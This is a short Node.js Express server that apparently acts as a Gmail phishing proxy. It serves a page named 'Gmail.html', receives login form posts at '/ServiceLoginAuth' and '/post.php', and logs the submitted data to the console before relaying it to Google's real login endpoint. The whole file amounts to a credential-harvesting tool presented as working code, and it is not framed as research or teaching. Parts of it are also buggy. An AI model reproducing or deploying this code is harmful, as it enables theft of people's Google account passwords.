var express = require('express');
var http = require('https');
var app = express.createServer();

function postLogIn(data, res) {
	console.log("data = " + data);
	var post_options = {
		host: 'accounts.google.com',
		port: '443',
		path: '/ServiceLoginAuth',
		method: 'POST',
		headers: {
				  'Content-Type': 'application/x-www-form-urlencoded',
				  'Content-Length': data.length
		}
	};	
	var myResponse = "";
	if (http) {  
		var post_req = http.request(post_options, function(res) {
		    if (res) {
			    res.setEncoding('utf8');
			    res.on('data', function (chunk) {
			    	myResponse += chunk;
			       	console.log('Response: ' + chunk);
			    });
			    res.render(myResponse);
			} else {
				console.log("no response object from http request");
			}
		});	 
		post_req.write(data);
	} else {
		console.log("no http request object");
	}

}
app.use(function(req, res, next){
    req.text = '';
    req.setEncoding('utf8');
    req.on('data', function(chunk){ req.text += chunk });
    req.on('end', next);
  
});
app.configure(function(){
    app.use(express.static(__dirname + '/public'));
    
});

app.get('/hello.txt', function (req, res) {
	var body = 'hello biatch';
	res.setHeader('Content-Type', 'text/plain');
  	res.setHeader('Content-Length', Buffer.byteLength(body));
  	res.end(body);});

app.get('/gmail.html', function(req,res) {
	res.render('Gmail.html');
});

app.post('/post.php', function (req, res) {
	console.log("post data = " + req.text);
});
app.post('/ServiceLoginAuth', function (req, res) {
	var postData = "";
	console.log("Entered ServiceLoginAuth..." + req.text);
	
	/*req.on('data', function (chunk) {
			req.rawBody += chunk;
			//console.log(chunk.toString());
			
	});*/
	//console.log(req.rawBody.toString());
	//res.redirect(303, 'https://accounts.google.com/ServiceLoginAuth');
	postLogIn(req.text,res);

});
//console.log(__dirname);
app.listen(3000);
console.log('listening on port 3000');
